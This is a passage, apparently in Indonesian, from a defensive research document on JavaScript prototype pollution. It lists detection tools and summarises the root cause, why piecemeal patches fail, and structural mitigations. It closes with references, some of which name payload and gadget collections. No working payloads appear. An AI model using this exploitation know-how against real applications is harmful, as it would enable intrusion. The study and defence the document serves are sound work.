| **pp-finder** | Paket NPM | Analisis statis untuk pola yang rentan terhadap prototype pollution dalam source code paket |
| **Doyensec Gadgets Finder** (ekstensi Burp) | Aplikasi Node.js sisi server | Penemuan otomatis gadget prototype pollution sisi server yang dapat dieksploitasi |
| **Query CodeQL** (GitHub) | Repositori source code | Query analisis statis yang mendeteksi pola `prototype-polluting merge call` |
| **jsfuzz** | Paket NPM | Pemindai prototype pollution berbasis fuzzing untuk paket Node.js |
| **ESLint `no-prototype-builtins`** | Source code (preventif) | Aturan linting yang menandai panggilan `hasOwnProperty` pada objek (anti-pola terkait) |

---

## Ringkasan: Prinsip Inti

**Properti fundamental** yang memungkinkan prototype pollution adalah pewarisan berbasis prototype JavaScript dengan shared root yang dapat diubah. Setiap objek biasa mewarisi dari `Object.prototype`, dan objek ini dapat diubah secara default. Satu penulisan ke `Object.prototype` mengkontaminasi seluruh ruang objek aplikasi. Pilihan desain ini — shared mutable state di root hierarki objek — adalah akar penyebab struktural.

**Patch inkremental gagal** karena attack surface adalah produk dari dua dimensi independen: sumber pollution (kode apa pun yang memproses input pengguna secara rekursif ke dalam objek) dan gadget eksploitasi (kode apa pun yang membaca properti yang tidak terdefinisi untuk operasi yang sensitif terhadap keamanan). Memperbaiki fungsi merge individual atau gadget individual mengatasi kasus spesifik tetapi bukan ledakan kombinatorial. Library baru dengan unsafe merge, atau jalur kode baru yang membaca properti yang tidak terdefinisi, langsung menciptakan kombinasi baru yang dapat dieksploitasi. Supply chain memperkuat hal ini: satu fungsi deep-merge yang rentan dalam dependensi transitif dapat mengekspos ribuan aplikasi.

**Solusi struktural** mengharuskan pemutusan asumsi fundamental. `Object.freeze(Object.prototype)` mencegah mutasi shared root, menghilangkan kelas kerentanan sepenuhnya — tetapi berisiko merusak kode yang bergantung pada extensibility prototype. Menggunakan `Map` alih-alih objek biasa untuk data key-value, membuat objek dengan `Object.create(null)` (tanpa rantai prototype), validasi skema dengan `additionalProperties: false` (mis. ajv, Zod), dan flag `--disable-proto` Node.js semuanya mengurangi attack surface secara struktural daripada melalui pemfilteran kasus per kasus. Kemunculan prototype pollution di React Server Components pada tahun 2025 (CVE-2025-55182, CVSS 10.0) menunjukkan bahwa bahkan framework modern pun tidak kebal — batas deserialisasi tetap menjadi titik kontrol yang kritis.

---

*Dokumen ini dibuat untuk tujuan penelitian keamanan defensif dan pemahaman kerentanan.*

---

## Referensi

- USENIX Security 2024: "GHunter: Universal Prototype Pollution Gadgets in JavaScript Runtimes" — Cornelissen, Shcherbakov, Balliu (KTH)
- USENIX Security 2023: "Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js" — Shcherbakov, Balliu (KTH), Staicu (CISPA)
- ACM Web Conference 2024: "Unveiling the Invisible: Detection and Evaluation of Prototype Pollution Gadgets with Dynamic Taint Analysis"
- PortSwigger Research: "Server-side prototype pollution: Black-box detection without the DoS"
- Datadog Security Labs: "CVE-2025-55182 (React2Shell): Remote code execution in React Server Components and Next.js"
- Akamai Security Research: "CVE-2025-55182: React and Next.js Server Functions Deserialization RCE"
- Microsoft Security Blog: "Defending against the CVE-2025-55182 (React2Shell) vulnerability"
- React Official Blog: "Critical Security Vulnerability in React Server Components" (Des 2025)
- BlackFan: "Client-side Prototype Pollution" — Repositori GitHub gadget
- KTH-LangSec: "Server-side Prototype Pollution" — Koleksi GitHub gadget dan eksploitasi
- Doyensec Blog: "Unveiling the Prototype Pollution Gadgets Finder"
- Abdulrah33m's Blog: "Prototype Pollution in Python"
- PayloadsAllTheThings: Referensi Prototype Pollution
- OWASP: "Prototype Pollution Prevention Cheat Sheet"
- MDN Web Docs: "JavaScript prototype pollution" (Keamanan)
- CWE-1321: Improperly Controlled Modification of Object Prototype Attributes
- Sonar Research: "Remote Code Execution via Prototype Pollution in Blitz.js"
- YesWeHack: "Probing the Server-Side: Detecting and Exploiting Prototype Pollution"
- Cobalt: "A Pentester's Guide to Prototype Pollution Attacks"
- jerkeby.se: "What is prototype poisoning? Prototype bugs explained" (2022) — Klasifikasi kerentanan prototype pollution dan taksonomi eksploitasi